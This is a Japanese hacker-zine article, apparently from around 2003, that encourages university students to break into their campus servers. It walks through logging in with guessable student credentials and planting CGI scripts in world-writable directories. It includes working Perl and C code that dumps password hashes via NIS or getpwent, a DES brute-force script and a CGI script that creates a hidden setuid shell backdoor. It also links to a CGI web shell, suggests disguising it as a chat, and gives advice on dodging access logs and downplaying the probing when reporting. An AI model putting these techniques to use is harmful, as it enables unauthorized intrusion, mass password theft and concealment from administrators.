x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x

 --- 第１章：Geekの為の楽しい大学生活 ---

 著者：PaiN

x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x

■0x01.) 初めに

　えー、全くHotな話題ではありませんが、今回は大学生、特に新入学生に向ける
学内サーバの楽しみ方を書いていきます。
　大学のような巨大ネットワークに自由に出入りできる機会は卒業したら無いかも
しれません。今うちに楽しんでおきましょう。
　大学生になったから「ハッカー甲子園」に出れなかった君。大学には人為的にセ
キュリティーホール（設定ミスとも読む）が数多く開けられています。ハッカー甲
子園に出場できなかった欲求を退学にならない程度に大学で発散させましょう。

　何を楽しむかは人それぞれです。セキュリティーに興味があるならセキュリティ
ー上の問題を探し、チャットが趣味なら学校のサーバをチャットサーバにして夜々
会話を楽しむ、友達とファイル交換する等、楽しみ方は様々です。

　もし、基礎知識が無ければ,まずはLinuxとプラットホームに依存しないプログラ
ミング言語1つを修得することを勧めます。これは確実に以後のPCライフを快適な
ものにするからです。

　この文章は去年大学へ入学した一人の学生が行ったことが、そのまま書かれてい
ます。え? ありえないヨ? と思っても結構適当な管理が目立つのが大学です。某情
報系大学、N社が管理する文系T大学を題材にしています。情報系だからとか企業が
管理しているからとかは関係ありません。テキトーな奴が管理するところはテキト
ーなサービスを提供します。


■0x02.) アカウントは貰ったか?

　まずは、環境設定から･･･。

　君は大学からアカウントを貰っただろうか。情報系ならもちろん演習用にアカウ
ントを作ってくれるだろうし、そうでない場合でもメールやWEBスペースは与えて
くれるのではないだろうか。もしくれないようなら`IT革命'という死語を使って管
理者を挑発しよう。
　なにをするにもアカウントは必須だ。大学はあくまで仲間だと思いたいから不正
アカウントの作成、他人のアカウント使用は避けたいのだ。

　以下は大学側が与える頻度の高いアカウントの種類だ。

1. メールアカウント

　これを与えないようではどうかしている。
　もし、もらえない場合は理事長宛てに手紙を書こう。

2. WEBスペース（ftp）のアカウント

　これは標準でない場合が多いが、申告すれば与えてくれる場合が多い。
　もし、君の学校が自己申告によりアカウントを発行してくれるようなら、発行し
てもらおう。その際、CGIが使えるかのチェックを忘れないように。大学のサーバ
でCGIを使わせてくれるということは、shellアカウント発行するのと似たようなも
のだ。

3. 演習室のWindowsログイン用アカウント

　パソコン関係の講義をするなら与えるだろう。ただ、今回はこの話はしない。私
のWindowsに関する知識が薄いからだ。WindowsサーバでのCGIの話は 0x05.) で語
ることにする。

3. shellアカウント

　情報系なら、CやPerl,LISP,Prolog,Javaなんかの演習にUnix系OSを使うことだろ
う。大学によっては、WindowsからTeraTermで演習用サーバにログインする場合や
、演習室のマシンにLinuxがインストールされている場合など様々だろう。

4. pppアカウント

　これは微妙だ。大学によってはくれるだろう。学校がFWで守られている場合は、
pppから入れば回避できるだろうが、電話代がかかるのでやめた方がいい。


　さて、これらのアカウントをどのように使っていくか考えよう。
　学校が用意していない場合でもshellが使えることもあるし、CGIが使えることも
ある。簡単に諦めてはいけないのだ！


■0x03.) shellが欲しいな

　Linux Userとしてはshellが欲しいと思うだろう。
　これがあれば大抵のことはできる。無いものは自分で書いてコンパイルすれば手
に入る環境だからだ。
　既に１つ以上のshellアカウント持っている場合でも、まだまだ探す価値はある
はずだ。できるだけ多くのアカウントあった方が便利だし、それだけ脆弱な管理体
制にあるサーバを発見する頻度は高いはずだ。私の場合だと、自分の学校で10-15
の常時稼働しているサーバへログインできるし、T大でも２つほどsshログインでき
るサーバを発見できた。

　以下簡単な捜し方を書こう。

1. メールサーバはLinuxだろ

　多くの大学のメールサーバはLinuxかBSDだろう。POP3で受信するなら、そのサー
バにアカウントがあるはずだ。管理が適当な場合、ここにログインできることがあ
る。
　これは実際、うちの学校と某T大でログインすることが出来た。

　試しに、

% telnet pop.hoge-u.ac.jp
% telnet pop.hoge-u.ac.jp 22

を試してみよう。上は通常のtelnetだが、これを開放しているところはまず無いだ
ろう。下が重要だ。port22はsshdが走っている可能性が高い。知っているだろうが
sshとはSecureShell、公開鍵暗号方式と共有鍵方式を使った所謂暗号化されたteln
etだ。これはサーバ管理を業者が行っている場合、開いている確率が高いだろう。

[pain@hex51 html]$ telnet ppp.hoge-u.ac.jp 22
Trying 211.211.211.211...
Connected to localhost.
Escape character is '^]'.
SSH-1.99-OpenSSH_3.6.1p2

となれば、sshdが稼働している。試しに`SSH-1.99-OpenSSH_3.6.1p2[ENTER]'と相
手の真似をして打ち込んでみよう。

・$i贅歃i汪僵
=diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1ssh-rsa,ssh-
dssfaes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,aes192-cbc,aes256
-cbc,rijndael-cbc@lysator.liu.sefaes128-cbc,3des-cbc,blowfish-cbc,cast128-
cbc,arcfour,aes192-cbc,aes256-cbc,rijndael-cbc@lysator.liu.seUhmac-md5,hma
c-sha1,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-sha1-96,hmac-md5-96U
hmac-md5,hmac-sha1,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-sha1-96,
hmac-md5-96 none,zlib

などど、返って来るだろう。さすがにtelnetコマンドでsshdと通信するのは無理な
ので、Linuxのsshコマンドか、Windowsの
TTSSH（http://www.sakurachan.org/soft/teraterm-j/ttssh/）を使い、ログイン
できないか試してみよう。
　このとき使うアカウントは、もちろん自分のメールアカウントだ。パスワードは
覚えているかい？

User: piyo02143
Pass: 830505
USER 学生番号、PASS 誕生日だったりするだろう。

% ssh pop.hoge-u.ac.jp -l piyo02143
piyo02143@pop's password: 
Last login: Wed Jul  2 04:08:18 2003 from 200.200.200.200
[piyo02143@pop hoge02143]$ 

とログインでたらOKだろう!!
（初めてログインする場合は相手の公開鍵を保存するか尋ねられますがyesと打ち込
めばパスワードを聞いてくるはずだ）

　入れなかったら諦めよう。きちんと管理しているってことだ。

2. NFSの親を当たる

　これは演習室のマシンにLinuxが入っている場合、かなりの確率で有効だろう。
　ユーザーのディレクトリはNFSでどこかのサーバのDiskをmountしているだろうか
ら、そのmount元のサーバへはログインできる可能性が高い。
　まず、演習室に行き、自分のアカウントでLinuxへログインしよう。
　そして、/etc/fstabを見てみよう。

% less /etc/fstab

とでもしてみると以下のような記述があるだろう。

foo:/vol/home  /home       nfs    defaults 0 0

　fooの/vol/homeを自機の/homeへmountしているってことだ。つまり、/homeの内
容はfooというマシンの/vol/homeだったのだ!

　fooというのは、どれのことか調べてみよう。

% host foo
hoo.hoge-u.ac.jp has address 201.201.201.201

と、正式な名称が分かったところでログインできないか試してみよう。

% ssh foo.hoge-u.ac.jp -l piyo02143
% telnet foo.hoge-u.ac.jp
% ftp foo.hoge-u.ac.jp

　もし、ログインできたらlastコマンドを使って、同じ学生がログインしていない
か調べてみよう。もしかしたらPC中毒な先輩を発見できるかもしれない。こういう
先輩を発見したら、彼の接続元を常に監視しよう。もしかしたらまだ自分の知らな
いログインできるサーバから、ログインして来る可能性があるからだ。


■0x04.) CGIが使いたいだろ （php含む）

　shellが手に入らなかった方、まだ諦めるのは早い。CGIがある。CGIは主にPerl
で書いたプログラムをサーバ側で実行し、その結果をクライアントであるブラウザ
に返すものだ。

　よく考えてみよう。CGIが使えるということはサーバにプログラムを置いて勝手
に実行できるということだ。大学のWEBサーバはperlの制限が一切無い場合が多い
のでshell並に役に立つだろう。

　すでにshellアカウントある方もCGIが使えるなら、もう１つ別のアカウントが手
に入る可能性がある。suEXECされていなければCGIはhttpdの権限で動くのでCGIか
らローカルなバックドアを作ってshellからそれを使用すればhttpdの権限が手に入
るのだ!! nobody, apache, webなんて名前だろう。これはファイルの所有者を適当
ユーザーで誤魔化すときに使える。
　さらにmod_phpでのPHPが使える場合は、確実にhttpdの権限でプログラムが動く。
これは速度を求めるあまりhttpd自体がphpエンジンを持ち別プロセスを生成せずに
httpd自体が実行するからだ。つまり同じサーバのphpは全て同じ権限で動くのであ
る（他人のログファイルも別phpから編集可能ってこと）。

　また、WindowsでCGIが使える場合、それが非常に大きなセキュリティ-ホールに
なっていることがある。T大ではCGIからIISのアクセスログを書き換えることさえ
も容易だった。

　さて、CGIが使いたくなってきただろう。

　次に、CGIを使う方法をあげていこう。

1. 自己申告

　学校へWEBスペースを使わせてくれるように申告しよう。
　その際にCGI,SSI,PHPが使用できるかきちんと聞いておこう。

2. 勝手に置いてしまいました

　shellアカウントを手に入れたサーバでhttpdが動いていないか確かめてみよう。

% ps -ax | grep httpd
 6042 ?        S      0:00 [httpd]
 6045 ?        S      0:00 [httpd]

と、httpdが動いているようならhttpd.conf
（/etc/httpd/conf/httpd.conf or /usr/local/httpd/conf/httpd.conf辺り）
を確認してhttpdのホームを確かめよう。大体が/home/httpd/だろう。

　そして、/home/httpd/cgi-bin/はCGIが稼働できるディレクトリだ。そこへ行っ
て書き込み可能なディレクトリが無いか探してみよう。もし、配布されているBBS
なんかを設置している場合は、lockやdat,logと言ったPermission 0777なディレク
トリを置いている管理人も稀にいるのだ。そこへ勝手にbbs.cgiと名をつけたCGI置
いてしまおう。ただ、access_logに残るのであまり頻繁に実行してはダメだ。使っ
た後はbbs.cgiをすぐに消しておこう。


■0x05.) セキュリティ上の問題を探せ

　さて、やっと本題に来ました。

　暇になったら学校のサーバのセキュリティ-チェックをやってみよう。思いもよ
らぬ人為的ミス(?)やシステムの根本的な設計ミスなど発見できるだろう。一応自
分の学校なので、他人の書いたbofなexploit等は使わないようにしよう。あくまで
自分の能力の範囲で管理者のミスを探すという遊びだ。

1. NISからユーザー情報を取得できたら（Linux/Shell/CGI）

　膨大な学生のアカウントを多数のマシンで管理するのは大変だ。そこで管理者は
NISを使い、特定のサーバのユーザー情報を別のマシンはmountする形で使用するだ
ろう。
　このNIS(ypserver)からユーザー情報を取り出してみよう。実はこのNISは異なる
アーキテクチャ間ではshadowモードが使用できないらしい。つまり、これからユー
ザー情報を取り出すとshadowされていない(たぶんDES暗号化された)パスワードが
手に入る可能性があるのだ。

　shellアカウントがあるなら、

% ypcat passwd

とやってみよう。これは演習室などのLinuxがインストールされているマシンにロ
グインして行うのが良いだろう。

hoge02143:XGJDwsgcD4REI:25643:714:Foo Hoge:/home/hoge/hoge01143/:/bin/bash

のような文字が大量に流れたら成功だ。問題は:で分けた2番目、`XGJDwsgcD4REI'
という部分だ。これはDESという方式で暗号化されたパスワードである。これを`J
ohn The Ripper'等を使いCrackすればユーザーのパスワードが分かるわけだ。もし、
ここがxだった場合はshadow化されているので、次の方法を考えてみよう。

　ypcatコマンドが存在しなかった場合、以下のプログラムを試してみよう。

-----  getusr.pl
#!/usr/bin/perl
# getusr.pl

my @info = ( );
print join(':', @info)."\n" while (@info = getpwent( ));
-----

　簡単だ。これはgetpwent()でシステムのユーザー情報を取得する方法だ。

　CGIの場合は以下のCGIを動かしてみよう。

-----  getusr.cgi
#!/usr/bin/perl

print "Content-Type: text/plain\x0d\x0a\x0d\x0a";
print join(':', @info)."\n" while (@info = getpwent( ));
-----

　これも同じだ。初めにhttp headerを吐いておけばよい。

　ちなみに、Cのプログラムならば、次のようになる。

-----  getusr.c
#include <stdio.h>
#include <pwd.h>

int main(void){
  struct passwd *p;
  while((p = getpwent()) != NULL)
    printf("%s:%s:%d:%d:%s:%s:%s\n",
           p->pw_name,
           p->pw_passwd,
           p->pw_uid,
           p->pw_gid,
           p->pw_gecos,
           p->pw_dir,
           p->pw_shell);

  return 0;
}
/* EOF */
-----

% ypcat passwd > passwd
や
% perl getusr.pl > passwd

とファイルへリダイレクトし、それを家に持ち帰ろう。その後それを提出する予定
があるのなら、それを解くプログラムを作っておくと評価が上がるだろう。
　うちの学校ではこの方法で6000弱、某T大では、500弱のユーザーのパスワードが
取得解読可能だった。

　ついでなので簡単なDESをCrackするプログラムを紹介しよう。
　Johnは強力だが、パスワードが一定の法則（例えばhoge（誕生日））の場合、自
分でcrack用のプログラムを書いた方が早い（辞書を作る方法もあるが）。

-----
#!/usr/bin/perl

my $DES  = 'XGJDwsgcD4REI';
my $salt = substr($DES, 0, 2);

for (my $i = 101; $i < 1232; $i++) {
    if (crypt(sprintf("hoge%04d", $i), $salt) eq $DES) {
        printf("passwd: hoge%04d\n", $i);
        last;
    }
}
-----

　これは、hoge0101 - hoge1231 までを総当たりするものだ。簡単だろう!
　DESは一方方向の暗号化なので、実際に候補となるパスワードを同じアルゴリズ
ム暗号化し、すでに暗号化されているものと比べていけばいいのだ。

2. CGI,PHPからbackdoor（Linux/CGI/Shell）

　これは特に問題ないように思えるが、管理者としてはあまり気持ちのいいもので
はないので一応ここに書いておく。

　CGIやmod_phpでのPHPは、httpdの権限で動くことが多い。もし、１つのサーバで
shellアカウントとCGIが両方使える環境にあるのなら、httpdの権限を取ることが
出るだろう。これでファイルの所有者などをある程度誤魔化せるので少し大き目の
ファイルを置いておく不安が減るのだ。

　一番初めに思いつくのが、

-----
#!/usr/bin/perl

print "Content-Type: text/plain\x0d\x0a\x0d\x0a";

system('cp /bin/sh /usr/tmp/.nobody') and print $!;
system('chmod 6755 /usr/tmp/.nobody') and print $!;
-----

だろう。

　しかし、最近の/bin/shは実UIDでないと意味の無い場合が多い。uid=500,euid=
48だったとして/bin/shを起動するとeuidが消えてしまうのだ!! これはまずいので
/bin/zshなど、この機能を持たないshellをsuidしよう。

　一番確実なのは、shellモドキを自分で作っておいて、それをsuidすることだろ
う。Perlの場合はsuidしたプログラムは-Uオプションでないと、かなり厳しい汚染
チェックを受けるので、うまくできない場合は#!/usr/bin/perl -Uを試してみよう。

　それでもダメな場合は、CGI-Shellを使ってみよう。
　これについては次項で説明する。

3. WindowsサーバでCGI可は危険? （Windows/CGI）

　WindowsサーバではCGIがとても巨大なセキュリティーホールになっている場合が
ある。この巨大なセキュリティホールを学生が自由に利用できるようにしているの
だ！

　内容はこうだ、WindowsはUnix/Linuxほどしっかりしたマルチユーザーの概念が
ない（ように思える）。NTFSはファイルにアクセスできるユーザーを制限できる
が、それは設定を行った場合のみ有効で、行っていない場合全てのユーザーから
読み込み可能な状態にある。ありそうにない話だが、N社が管理するT大学のIIS
サーバはCGIからサーバ上のファイルが読み/書き/作成可能な状態にあった。
　「CGI != 掲示板」ということだ。

　以下に私が書いたサンプルプログラムを載せる。

http://hex51.darktech.org/scripts/win_nrcs.cgi.txt

　ドキュメントは以下参照。

http://hex51.darktech.org/documents/nrcs.html

　これはCGIをターミナルのように扱うものだ。最低限必要なコマンドはPerlで書
いているので/binが空でもPerlさえあればうまく動作するだろう。

　自分で書ける人は自分の使いやすいように書いたらいいだろう。バレにくくした
いならば、見た目チャットで実際にチャットとしても使えるが、名前をshellで入
室すると発言欄からコマンドが打てるようにするとバレにくいだろう!

　うまくできたら、拡張子を.cgiにして設置してみよう。このときエラーでうまく
動かなかったなら.plに変更して試そう。うまく動いたなら、サーバ内探索だ。あ
まり頻繁にアクセスするのは目立つので止すべきだ。

　ここで1つおもしろい話をしよう（常識かもしれないが）。
　一昔前に流行ったIISのUnicodeをDecodeするときに起きるセキュリティーホール
を覚えているだろうか？ あれは/../../の真中の/をEnccodeされたunicodeで書く
ことで、WEBからはアクセスできないはずの/winnt/system32/cmd.exeを実行してサ
ーバを操作するものだった。
　よく考えてみよう。サーバにアカウントがあってCGIが使えるのなら自分の領域
にcmd.exeをアップロードすれば
http://www.hoge-u.ac.jp/~piyo02143/cmd.exe?/c+dir
等としてコマンドが発行できるのだ。ただ、アクセスログからやっている人物がモ
ロバレなのでやらないほうがいい'-)


■0x06.) 問題を発見したら報告しようか

　発見したら、物分かりのいい教授にこっそり教えてあげよう。成績が良くなるか
もしれないし、いい研究室に入れてくれるかもしれない。報告する人物の選択を誤
るとクラッカー扱いされるので注意しよう。初めから言い訳を考えておくのがベス
トだ。

　なにより、最小限の検証しか行わないこと、行ってないように見せかけること、
これが重要だ。


■0x07.) 最後に

　長くなりましたがここまでにします。
　大学には、私のような単なるパソマニもいれば、ptrace/kmodのexploitを使いke
rnel2.2.x-2.4.18のLinuxでrootを取りまくる奴、違法動画を大量にアップロード
してサーバのHDDを満タンにしやがった奴、監視カメラを遠隔操作する奴など様々
です。
　管理者は外部ばかり気にしないで内部にも気をつけましょう。
　学生は、学校を仲間だと思って度を超えた悪さをするのはよしましょう。

　充実した大学生活を。

　では、またいつか。

